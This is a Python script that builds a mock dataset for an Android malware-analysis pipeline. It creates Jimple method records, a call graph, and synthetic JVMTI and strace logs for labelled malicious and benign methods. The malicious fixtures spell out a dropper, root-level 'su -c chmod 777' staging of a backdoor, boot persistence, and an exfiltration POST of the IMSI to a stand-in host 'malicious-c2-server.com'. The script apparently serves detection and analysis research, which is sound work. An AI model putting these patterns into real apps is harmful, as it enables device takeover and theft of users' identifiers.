import os
import sqlite3
import time
from loguru import logger

from config import path_in_project

LOG_DIR = path_in_project("logs")
DB_PATH = path_in_project("pipeline.db")

def setup_directories():
    os.makedirs(LOG_DIR, exist_ok=True)
    logger.info(f"Ensured directories exist at: {LOG_DIR}")

def generate_mock_db():
    if os.path.exists(DB_PATH):
        try:
            os.remove(DB_PATH)
            logger.info("Cleared existing SQLite DB.")
        except Exception as e:
            logger.warning(f"Could not remove db file: {e}")
            
    conn = sqlite3.connect(DB_PATH)
    
    # Create Jimple methods table
    conn.execute('''CREATE TABLE IF NOT EXISTS jimple_methods (
        class_name TEXT, method_name TEXT, jimple_text TEXT,
        cfg_json TEXT, PRIMARY KEY (class_name, method_name))''')
    
    # Create Dynamic edges table
    conn.execute('''CREATE TABLE IF NOT EXISTS dynamic_edges (
        method TEXT, class TEXT, label TEXT,
        type TEXT DEFAULT 'DYNAMIC_ONLY',
        ts INTEGER,
        UNIQUE(method, class, label))''')
    conn.execute('CREATE INDEX IF NOT EXISTS idx_derp ON dynamic_edges(method, class)')

    # Jimple mock dataset - 7 Malicious and 5 Benign methods
    jimple_mock_data = [
        # --- Malicious Dropper & Staging Thread ---
        (
            'com.malicious.Dropper', 'z1',
            'public void z1() {\n'
            '    r0 = new dalvik.system.DexClassLoader;\n'
            '    specialinvoke r0.<dalvik.system.DexClassLoader: void <init>(java.lang.String,java.lang.String,java.lang.String,java.lang.ClassLoader)>("/data/user/0/com.malicious/files/payload.key", "/data/user/0/com.malicious/code_cache", null, r1);\n'
            '    r2 = virtualinvoke r0.<dalvik.system.DexClassLoader: java.lang.Class loadClass(java.lang.String)>("com.malicious.PayloadStager");\n'
            '}',
            '{"branch_true_44": "true", "class_loaded": "com.malicious.PayloadStager"}'
        ),
        (
            'com.malicious.Decryptor', 'decrypt',
            'public void decrypt() {\n'
            '    r0 = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");\n'
            '    r1 = javax.crypto.spec.SecretKeySpec.init("supersecretkey12");\n'
            '    virtualinvoke r0.<javax.crypto.Cipher: byte[] doFinal(byte[])>(r2);\n'
            '}',
            '{"cipher_initialized": "true", "decrypted_success": "true"}'
        ),
        (
            'com.malicious.PayloadStager', 'runPayload',
            'public void runPayload() {\n'
            '    r0 = java.lang.Runtime.getRuntime();\n'
            '    virtualinvoke r0.<java.lang.Runtime: java.lang.Process exec(java.lang.String)>("su -c chmod 777 /data/local/tmp/backdoor");\n'
            '}',
            '{"exec_su": "true", "payload_staged": "true"}'
        ),
        
        # --- Malicious Persistence Thread ---
        (
            'com.malicious.Persistence', 'installService',
            'public void installService() {\n'
            '    r0 = new android.content.ComponentName;\n'
            '    specialinvoke r0.<android.content.ComponentName: void <init>(java.lang.String,java.lang.String)>("com.malicious", "com.malicious.BootReceiver");\n'
            '    r1 = android.os.ServiceManager.getService("AlarmManager");\n'
            '    virtualinvoke r1.<android.app.AlarmManager: void setExactAndAllowWhileIdle(int,long,android.app.PendingIntent)>(0, r2, r3);\n'
            '}',
            '{"alarm_set": "true", "persistence_installed": "true"}'
        ),
        (
            'com.malicious.BootReceiver', 'onReceive',
            'public void onReceive(android.content.Context context, android.content.Intent intent) {\n'
            '    r0 = intent.getAction();\n'
            '    if (r0.equals("android.intent.action.BOOT_COMPLETED")) {\n'
            '        r1 = new android.content.Intent;\n'
            '        specialinvoke r1.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>(context, com.malicious.C2Client.class);\n'
            '        virtualinvoke context.<android.content.Context: android.content.ComponentName startService(android.content.Intent)>(r1);\n'
            '    }\n'
            '}',
            '{"is_boot_completed": "true", "service_started": "true"}'
        ),
        
        # --- Malicious C2 & SMS Thread ---
        (
            'com.malicious.C2Client', 'sendExfiltratedData',
            'public void sendExfiltratedData() {\n'
            '    r0 = new java.net.URL;\n'
            '    specialinvoke r0.<java.net.URL: void <init>(java.lang.String)>("http://malicious-c2-server.com/api/exfil");\n'
            '    r1 = virtualinvoke r0.<java.net.URL: java.net.URLConnection openConnection()>();\n'
            '    r2 = (java.net.HttpURLConnection) r1;\n'
            '    virtualinvoke r2.<java.net.HttpURLConnection: void setRequestMethod(java.lang.String)>("POST");\n'
            '    virtualinvoke r2.<java.net.HttpURLConnection: int getResponseCode()>();\n'
            '}',
            '{"c2_connected": "true", "data_sent": "true"}'
        ),
        (
            'com.malicious.SmsSender', 'send',
            'public void send() {\n'
            '    r0 = android.telephony.SmsManager.getDefault();\n'
            '    virtualinvoke r0.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>("5556", null, "IMSI exfiltrated!", null, null);\n'
            '}',
            '{"sms_sent": "true"}'
        ),
        
        # --- Benign UI & Settings ---
        (
            'com.benign.MainActivity', 'onCreate',
            'public void onCreate(android.os.Bundle bundle) {\n'
            '    specialinvoke r0.<android.app.Activity: void onCreate(android.os.Bundle)>(bundle);\n'
            '    virtualinvoke r0.<com.benign.MainActivity: void setContentView(int)>(2131427356);\n'
            '    r1 = virtualinvoke r0.<com.benign.MainActivity: android.view.View findViewById(int)>(2131230812);\n'
            '    virtualinvoke r0.<com.benign.MainActivity: void loadSettings()>();\n'
            '}',
            '{"view_initialized": "true"}'
        ),
        (
            'com.benign.Settings', 'loadSettings',
            'public void loadSettings() {\n'
            '    r0 = virtualinvoke r1.<android.content.Context: android.content.SharedPreferences getSharedPreferences(java.lang.String,int)>("app_settings", 0);\n'
            '    r2 = virtualinvoke r0.<android.content.SharedPreferences: java.lang.String getString(java.lang.String,java.lang.String)>("user_theme", "dark");\n'
            '}',
            '{"prefs_opened": "true", "theme_read": "true"}'
        ),
        (
            'com.benign.UI', 'render',
            'public void render() {\n'
            '    r0 = new android.view.View;\n'
            '    virtualinvoke r0.<android.view.View: void invalidate()>();\n'
            '    virtualinvoke r0.<android.view.View: void requestLayout()>();\n'
            '}',
            '{"ui_invalidated": "true"}'
        ),
        (
            'com.benign.UI', 'updateLayout',
            'public void updateLayout() {\n'
            '    r0 = new android.widget.LinearLayout;\n'
            '    virtualinvoke r0.<android.widget.LinearLayout: void setOrientation(int)>(1);\n'
            '}',
            '{"layout_oriented": "true"}'
        ),
        (
            'com.benign.ImageLoader', 'loadCache',
            'public void loadCache() {\n'
            '    r0 = new java.io.File;\n'
            '    specialinvoke r0.<java.io.File: void <init>(java.lang.String)>("/data/user/0/com.benign/cache/img.png");\n'
            '    r1 = virtualinvoke r0.<java.io.File: boolean exists()>();\n'
            '}',
            '{"cache_checked": "true"}'
        )
    ]
    
    for class_name, method_name, jimple_text, cfg_json in jimple_mock_data:
        conn.execute('INSERT OR REPLACE INTO jimple_methods VALUES (?,?,?,?)',
            (class_name, method_name, jimple_text, cfg_json))
    
    # Create Callgraph table
    conn.execute('CREATE TABLE IF NOT EXISTS callgraph (caller TEXT, callee TEXT)')
    
    # Populate callgraph relations
    cg_edges = [
        ('com.malicious.Dropper.z1', 'com.malicious.Decryptor.decrypt'),
        ('com.malicious.Decryptor.decrypt', 'com.malicious.PayloadStager.runPayload'),
        ('com.malicious.PayloadStager.runPayload', 'com.malicious.Persistence.installService'),
        ('com.malicious.Persistence.installService', 'com.malicious.BootReceiver.onReceive'),
        ('com.malicious.BootReceiver.onReceive', 'com.malicious.C2Client.sendExfiltratedData'),
        ('com.malicious.C2Client.sendExfiltratedData', 'com.malicious.SmsSender.send'),
        ('com.benign.MainActivity.onCreate', 'com.benign.Settings.loadSettings'),
        ('com.benign.MainActivity.onCreate', 'com.benign.UI.render'),
        ('com.benign.MainActivity.onCreate', 'com.benign.UI.updateLayout')
    ]
    
    for caller, callee in cg_edges:
        conn.execute('INSERT INTO callgraph VALUES (?,?)', (caller, callee))
    
    conn.commit()
    conn.close()
    logger.info("Mock SQLite DB created with realistic callgraph and Jimple code.")

def generate_mock_jvmti():
    log_path = os.path.join(LOG_DIR, 'jvmti_trace.log')
    base_ts = int(time.time() * 1e9)
    
    # We will generate a rich set of traces spanning 30s window across multiple threads
    lines = []
    
    # Helper to load a class
    def classload(ts, sig):
        return f"CLASSLOAD|{ts}|{sig}"
        
    # Helper for entry/exit
    def entry(ts, tid, clazz, method, sig="()V"):
        return f"ENTRY|{ts}|{tid}|{clazz}|{method}|{sig}"
        
    def exit(ts, tid, clazz, method, sig="()V"):
        return f"EXIT|{ts}|{tid}|{clazz}|{method}|{sig}"

    # --- Thread 1042: Dropper & Staging ---
    # Duration: base_ts -> base_ts + 10s
    t_1042 = base_ts
    lines.append(classload(t_1042, "com.malicious.Dropper"))
    lines.append(classload(t_1042 + int(1e8), "com.malicious.Decryptor"))
    lines.append(classload(t_1042 + int(2e8), "com.malicious.PayloadStager"))
    
    # com.malicious.Dropper.z1 entry
    lines.append(entry(t_1042 + int(5e8), 1042, "com.malicious.Dropper", "z1"))
    
    # com.malicious.Decryptor.decrypt entry
    lines.append(entry(t_1042 + int(1e9), 1042, "com.malicious.Decryptor", "decrypt"))
    
    # JNI load classload event inside Decryptor.decrypt (simulates loading standard or custom native JNI lib)
    lines.append(classload(t_1042 + int(1.5e9), "libdecrypt.so::AES_decrypt @ 0x7f3a1c"))
    
    # exit Decryptor.decrypt
    lines.append(exit(t_1042 + int(2.5e9), 1042, "com.malicious.Decryptor", "decrypt"))
    
    # com.malicious.PayloadStager.runPayload entry
    lines.append(entry(t_1042 + int(3e9), 1042, "com.malicious.PayloadStager", "runPayload"))
    lines.append(exit(t_1042 + int(4.5e9), 1042, "com.malicious.PayloadStager", "runPayload"))
    
    # exit Dropper.z1
    lines.append(exit(t_1042 + int(5e9), 1042, "com.malicious.Dropper", "z1"))
    
    # --- Thread 1043: Persistence ---
    # Duration: base_ts + 6s -> base_ts + 12s
    t_1043 = base_ts + int(6e9)
    lines.append(classload(t_1043, "com.malicious.Persistence"))
    lines.append(classload(t_1043 + int(1e8), "com.malicious.BootReceiver"))
    
    lines.append(entry(t_1043 + int(5e8), 1043, "com.malicious.Persistence", "installService"))
    lines.append(entry(t_1043 + int(1.5e9), 1043, "com.malicious.BootReceiver", "onReceive", "(Landroid/content/Context;Landroid/content/Intent;)V"))
    lines.append(exit(t_1043 + int(3.5e9), 1043, "com.malicious.BootReceiver", "onReceive", "(Landroid/content/Context;Landroid/content/Intent;)V"))
    lines.append(exit(t_1043 + int(4.5e9), 1043, "com.malicious.Persistence", "installService"))

    # --- Thread 1044: C2 & SMS Client ---
    # Duration: base_ts + 13s -> base_ts + 20s
    t_1044 = base_ts + int(13e9)
    lines.append(classload(t_1044, "com.malicious.C2Client"))
    lines.append(classload(t_1044 + int(1e8), "com.malicious.SmsSender"))
    
    lines.append(entry(t_1044 + int(5e8), 1044, "com.malicious.C2Client", "sendExfiltratedData"))
    lines.append(entry(t_1044 + int(2e9), 1044, "com.malicious.SmsSender", "send"))
    lines.append(exit(t_1044 + int(4e9), 1044, "com.malicious.SmsSender", "send"))
    lines.append(exit(t_1044 + int(5.5e9), 1044, "com.malicious.C2Client", "sendExfiltratedData"))

    # --- Thread 1045: Benign UI Thread ---
    # Duration: base_ts + 30s -> base_ts + 34s
    t_1045 = base_ts + int(30e9)
    lines.append(classload(t_1045, "com.benign.MainActivity"))
    lines.append(classload(t_1045 + int(5e7), "com.benign.Settings"))
    lines.append(classload(t_1045 + int(1e8), "com.benign.UI"))
    
    lines.append(entry(t_1045 + int(2e8), 1045, "com.benign.MainActivity", "onCreate", "(Landroid/os/Bundle;)V"))
    
    lines.append(entry(t_1045 + int(5e8), 1045, "com.benign.Settings", "loadSettings"))
    lines.append(exit(t_1045 + int(1.2e9), 1045, "com.benign.Settings", "loadSettings"))
    
    lines.append(entry(t_1045 + int(1.5e9), 1045, "com.benign.UI", "render"))
    lines.append(exit(t_1045 + int(2.2e9), 1045, "com.benign.UI", "render"))
    
    lines.append(entry(t_1045 + int(2.5e9), 1045, "com.benign.UI", "updateLayout"))
    lines.append(exit(t_1045 + int(3.2e9), 1045, "com.benign.UI", "updateLayout"))
    
    lines.append(exit(t_1045 + int(3.8e9), 1045, "com.benign.MainActivity", "onCreate", "(Landroid/os/Bundle;)V"))

    # --- Thread 1046: Benign Background Loader ---
    # Duration: base_ts + 40s -> base_ts + 42s
    t_1046 = base_ts + int(40e9)
    lines.append(classload(t_1046, "com.benign.ImageLoader"))
    lines.append(entry(t_1046 + int(2e8), 1046, "com.benign.ImageLoader", "loadCache"))
    lines.append(exit(t_1046 + int(1.5e9), 1046, "com.benign.ImageLoader", "loadCache"))

    with open(log_path, 'w') as f:
        f.write('\n'.join(lines) + '\n')
        
    logger.info("Mock JVMTI log created containing 5 distinct threads and 12 executions.")
    return base_ts

def generate_mock_strace(base_ts):
    log_path = os.path.join(LOG_DIR, 'strace.log')
    base_ts_sec = base_ts / 1e9
    
    lines = []
    
    # Helper to generate a line
    def syscall(tid, ts_offset_sec, sysname, args, retval):
        t = base_ts_sec + ts_offset_sec
        return f"{tid} {t:.9f} {sysname}({args}) = {retval}"

    # Syscalls mapping back to thread executions based on timeframe:
    
    # --- Thread 1042 (Dropper & Decryptor) ---
    # Dropper.z1 is [0.5s, 5.0s]
    # Decryptor.decrypt is [1.0s, 2.5s]
    # PayloadStager.runPayload is [3.0s, 4.5s]
    lines.append(syscall(1042, 0.7, "openat", "-1, '/data/user/0/com.malicious/files/payload.key', O_RDONLY", "3"))
    lines.append(syscall(1042, 1.2, "read", "3, 'encrypted_aes_payload_data_bytes_stream...', 4096", "4096"))
    lines.append(syscall(1042, 1.8, "mmap", "NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0", "0x7f4b8c"))
    lines.append(syscall(1042, 2.2, "close", "3", "0"))
    lines.append(syscall(1042, 3.5, "execve", "'/system/bin/su', ['su', '-c', 'chmod', '777', '/data/local/tmp/backdoor'], 0x7ffd9c", "0"))
    lines.append(syscall(1042, 4.0, "mprotect", "0x7f4b8c, 8192, PROT_READ|PROT_EXEC", "0"))

    # --- Thread 1043 (Persistence) ---
    # Persistence.installService is [6.5s, 10.5s]
    # BootReceiver.onReceive is [7.5s, 9.5s]
    lines.append(syscall(1043, 6.8, "openat", "-1, '/data/system/users/0/admin_receivers.xml', O_RDWR|O_CREAT", "4"))
    lines.append(syscall(1043, 7.2, "write", "4, '<admin-receiver>com.malicious.BootReceiver</admin-receiver>', 60", "60"))
    lines.append(syscall(1043, 8.2, "openat", "-1, '/etc/init.d/malware', O_WRONLY|O_CREAT", "5"))
    lines.append(syscall(1043, 8.8, "write", "5, '#!/system/bin/sh\\n/data/local/tmp/backdoor &\\n', 38", "38"))
    lines.append(syscall(1043, 9.2, "close", "5", "0"))
    lines.append(syscall(1043, 10.0, "close", "4", "0"))

    # --- Thread 1044 (C2 & SMS Client) ---
    # C2Client.sendExfiltratedData is [13.5s, 18.5s]
    # SmsSender.send is [15.0s, 17.0s]
    lines.append(syscall(1044, 13.8, "connect", "6, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr('192.168.1.200')}, 16", "0"))
    lines.append(syscall(1044, 14.4, "sendto", "6, 'POST /api/exfil HTTP/1.1\\r\\nHost: malicious-c2-server.com\\r\\nContent-Length: 18\\r\\n\\r\\nimsi=310260000000000', 112, 0, NULL, 0", "112"))
    lines.append(syscall(1044, 16.0, "openat", "-1, '/dev/sms', O_WRONLY", "7"))
    lines.append(syscall(1044, 16.5, "write", "7, '5556:IMSI exfiltrated!', 23", "23"))
    lines.append(syscall(1044, 16.8, "close", "7", "0"))
    lines.append(syscall(1044, 17.8, "close", "6", "0"))

    # --- Thread 1045 (Benign UI Thread) ---
    # MainActivity.onCreate is [30.2s, 33.8s]
    # Settings.loadSettings is [30.5s, 31.2s]
    # UI.render is [31.5s, 32.2s]
    # UI.updateLayout is [32.5s, 33.2s]
    lines.append(syscall(1045, 30.3, "openat", "-1, '/data/user/0/com.benign/shared_prefs/app_settings.xml', O_RDONLY", "8"))
    lines.append(syscall(1045, 30.7, "read", "8, '<map><string name=\"user_theme\">dark</string></map>', 256", "52"))
    lines.append(syscall(1045, 31.0, "close", "8", "0"))
    lines.append(syscall(1045, 31.8, "write", "1, 'UI invalidate called', 20", "20"))
    lines.append(syscall(1045, 32.8, "write", "1, 'Layout orientation horizontal/vertical updated', 45", "45"))

    # --- Thread 1046 (Benign Background Loader) ---
    # ImageLoader.loadCache is [40.2s, 41.5s]
    lines.append(syscall(1046, 40.5, "openat", "-1, '/data/user/0/com.benign/cache/img.png', O_RDONLY", "9"))
    lines.append(syscall(1046, 41.0, "read", "9, '\\x89PNG\\r\\n\\x1a\\n...', 1024", "1024"))
    lines.append(syscall(1046, 41.3, "close", "9", "0"))

    with open(log_path, 'w') as f:
        f.write('\n'.join(lines) + '\n')
        
    logger.info("Mock strace log created containing realistic system calls aligned with method execution windows.")

if __name__ == "__main__":
    setup_directories()
    generate_mock_db()
    base_ts = generate_mock_jvmti()
    generate_mock_strace(base_ts)
    logger.info("Comprehensive mock pipeline dataset successfully created.")
